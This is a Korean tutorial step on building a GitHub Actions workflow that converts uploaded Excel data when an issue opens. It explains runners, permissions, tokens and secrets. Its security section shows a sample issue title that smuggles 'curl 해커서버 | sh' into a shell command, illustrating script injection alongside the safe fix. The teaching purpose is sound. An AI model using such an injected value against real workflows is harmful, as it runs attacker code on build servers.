Step 3 · GitHub Actions 자동화

"이슈가 열리면 → GitHub 클라우드에 진짜 Windows 서버를 하나 띄워서 → 엑셀을 변환하고 → 결과를 커밋해라." 이 문장을 GitHub이 알아듣는 YAML로 쓰는 단계입니다.

📚 시작 전 이론: GitHub Actions가 동작하는 방식

이 Step에서 쓰는 YAML 몇십 줄이 진짜 클라우드 서버에서 실제 명령을 실행합니다. 그만큼 권한과 보안을 이해하고 써야 해요. 실행 모델 → runner → 문법 → 보안 순서로 정리합니다.

Workflow
.github/workflows/*.yml 파일 하나. "언제, 어디서, 무엇을" 실행할지 적은 자동화 설계도.
Action
남이 만들어 공개한 재사용 부품. uses: actions/checkout@v6처럼 이름@버전으로 불러 씁니다.
Context · 표현식
${{ github.event.issue.title }}처럼 실행 정보를 꺼내 쓰는 문법. 셸이 실행되기 전에 글자 그대로 치환돼요.
GITHUB_TOKEN
GitHub이 실행마다 자동으로 발급하는 임시 토큰. 해당 저장소에만 쓸 수 있고, job이 끝나면 만료됩니다.
permissions
GITHUB_TOKEN에 줄 권한 목록. contents: write처럼 필요한 것만 적는 것이 원칙(최소 권한).
Secret
API 키 같은 비밀 값을 저장소 설정에 암호화해 보관하는 곳. 워크플로우에서 ${{ secrets.이름 }}으로 꺼내고, 로그에는 ***로 가려져요.

실행 모델: Event → Workflow → Job → Step

⚡

Event (on)

무엇이 일어나면 실행할지. push, pull_request, issues, 정해진 시간(schedule), 수동 실행 등.

🧩

Job

한 대의 runner에서 실행되는 작업 묶음. Job끼리는 기본적으로 병렬로 돌아요.

🖥️

Runner (runs-on)

job을 실제로 실행하는 컴퓨터. GitHub-hosted runner는 job마다 새로 만들어지는 실제 VM이고, ubuntu / windows / macos 중 고릅니다.

📝

Step

순서대로 실행되는 명령. run:은 셸 명령, uses:는 남이 만든 Action 재사용.

runner = job마다 새로 만들어지는 진짜 서버

runs-on: windows-latest라고 쓰면 GitHub이 자기 클라우드(Microsoft Azure)에 깨끗한 Windows Server VM을 새로 만들어 이 job 하나에만 배정합니다. 여러분의 파이썬 코드는 그 서버에서 실제로 실행되고, job이 끝나면 VM은 통째로 폐기돼요. 이 사실에서 중요한 결론이 몇 가지 나옵니다.

  • 처음엔 빈 컴퓨터 — 저장소 코드조차 없어요. 그래서 첫 step이 항상 actions/checkout입니다.
  • 아무것도 남지 않음 — 만든 파일은 job이 끝나면 사라지므로, 결과물은 커밋·artifact 등으로 밖에 보내야 해요. 이번엔 docs 브랜치에 커밋합니다.
  • 도구는 미리 깔려 있음 — Git, Python, Node, PowerShell 등 개발 도구가 설치된 이미지로 시작해요. 하지만 Microsoft Office(Excel)는 없습니다.
  • 이미지 버전은 바뀜 — windows-latest는 "현재 최신 안정 이미지"를 가리키는 별명이라 시간이 지나면 바뀌어요(현재는 Windows Server 2025 계열). 실제 버전은 실행 로그의 Set up job → Runner Image에서 확인할 수 있어요.
  • Windows의 기본 셸은 PowerShell — run:은 기본적으로 pwsh로 실행되므로 환경 변수는 $env:NAME으로 읽어요. bash 스크립트를 돌릴 step에는 shell: bash를 따로 적습니다.

워크플로우 파일 해부

.github/workflows/ 폴더 안의 .yml 파일이 곧 워크플로우입니다. 들여쓰기(스페이스 2칸)가 의미를 가지니 주의하세요.

name: Excel → Dashboard          # Actions 탭에 보이는 이름

on:                              # ⚡ 언제?
  issues:
    types: [opened]              #    이슈가 "열렸을 때"

permissions:                     # 🔑 이 워크플로우가 가진 권한 (최소한만!)
  contents: write                #    코드/브랜치에 push
  issues: write                  #    이슈에 댓글

jobs:
  convert:                       # 🧩 Job 이름
    if: startsWith(github.event.issue.title, '[EXCEL]')
    runs-on: windows-latest      # 🖥️ GitHub이 이 job 전용 Windows 서버(VM)를 새로 만든다
    steps:                       # 📝 순서대로 실행
      - uses: actions/checkout@v6            # 저장소 코드 내려받기
      - uses: actions/setup-python@v6        # 파이썬 설치
        with: { python-version: "3.12" }
      - run: pip install -r scripts/requirements.txt
      - run: python scripts/excel_to_json.py input.xlsx --out build/data.json

YAML에서 자주 하는 실수

실수결과와 해결
탭 문자로 들여쓰기YAML은 탭을 허용하지 않아요. 항상 스페이스
들여쓰기 한 칸 어긋남steps: 밖으로 빠지는 등 의미가 바뀜. Actions 탭에 빨간 오류로 표시됨
[, :, #, *로 시작하거나 포함된 값목록·주석 등으로 해석될 수 있어 따옴표로 감싸기 (예: title: "[EXCEL] ")
파일 위치 오타.github/workflows/가 아니면 워크플로우로 인식되지 않음

checkout이 하는 일

actions/checkout은 빈 runner에 저장소를 clone해 줍니다. issues 이벤트일 때는 기본 브랜치(main)의 최신 커밋을 가져와요. 기본값은 최근 커밋 1개만 받는 얕은 clone이라 다른 브랜치(docs)는 들어 있지 않습니다. 그래서 배포 스크립트가 git fetch origin docs를 따로 해요. 또 checkout은 GITHUB_TOKEN을 Git 설정에 넣어 두기 때문에, 이후 step에서 별도 로그인 없이 git push가 됩니다.

권한: 누가 이 자동화를 깨울 수 있나?

공개 저장소의 이슈는 GitHub 계정만 있으면 누구나 열 수 있어요. 이벤트에는 작성자와 저장소의 관계가 author_association으로 들어 있습니다. OWNER(소유자), MEMBER(조직 멤버), COLLABORATOR(초대된 협업자)만 허용하고, CONTRIBUTOR·NONE 등 나머지는 건너뛰게 하는 것이 이번 워크플로우의 문지기예요. 참고로 GITHUB_TOKEN으로 만든 push·이슈 같은 이벤트는 (무한 반복을 막기 위해) 새 워크플로우 실행을 만들지 않습니다.

꼭 알아야 할 보안 두 가지

1. 스크립트 인젝션: 이슈 제목/본문을 run: 에 직접 넣지 마세요 ${{ }}는 셸이 실행되기 전에 글자 그대로 붙여넣어집니다. 이슈는 아무나 쓸 수 있는 입력이라, 아래처럼 쓰면 이슈 제목에 "; curl 해커서버 | sh; echo " 같은 걸 넣어 runner에서 임의 명령을 실행할 수 있어요. 
# ❌ 위험
- run: echo "${{ github.event.issue.title }}"
# ✅ 안전: 환경 변수로 전달하면 셸이 "명령"이 아닌 "값"으로 취급
- env:
    TITLE: ${{ github.event.issue.title }}
  run: echo "$TITLE"
2. GITHUB_TOKEN과 Secrets 워크플로우마다 GitHub이 자동으로 임시 토큰(GITHUB_TOKEN)을 발급합니다. 권한은 permissions:로 필요한 만큼만 주세요. API 키 같은 비밀 값은 코드에 쓰지 말고 Settings → Secrets and variables → Actions에 저장한 뒤 ${{ secrets.이름 }}으로 꺼내 씁니다. 로그에는 ***로 가려져요.
✅ 실습 전 셀프 체크
  • event · workflow · job · step · runner의 관계를 한 문장으로 설명할 수 있나요?
  • runner에서 만든 파일이 다음 실행 때 왜 남아 있지 않은지 설명할 수 있나요?
  • ${{ github.event.issue.title }}를 run:에 직접 쓰면 왜 위험한지 말할 수 있나요?
  • permissions:에 contents: write와 issues: write가 각각 왜 필요한지 말할 수 있나요?

3-1. 이슈 템플릿 + 워크플로우 만들기

git switch -c feature/actions

3-2. 저장소 설정 확인

  1. 라벨 만들기 — 이슈 템플릿의 라벨이 저장소에 있어야 자동으로 붙어요. 
    gh label create excel-upload --color 4F46E5 --description "엑셀 데이터 업로드"
  2. Actions 권한 확인 — Settings → Actions → General → Workflow permissions. 워크플로우의 permissions:가 우선하지만, 조직 정책으로 막혀 있다면 "Read and write permissions"를 선택해야 할 수 있어요.
  3. 커밋 & push 
    git add .
git commit -m "이슈 기반 엑셀 변환 워크플로우 추가"
git switch main && git merge feature/actions && git push
💡 YAML이 맞는지 확인하는 법 push 후 Actions 탭에 "Excel → Dashboard" 워크플로우가 목록에 보이면 문법은 통과입니다. 빨간 경고가 보이면 Claude에게 오류 메시지를 그대로 붙여넣고 고쳐 달라고 하세요.
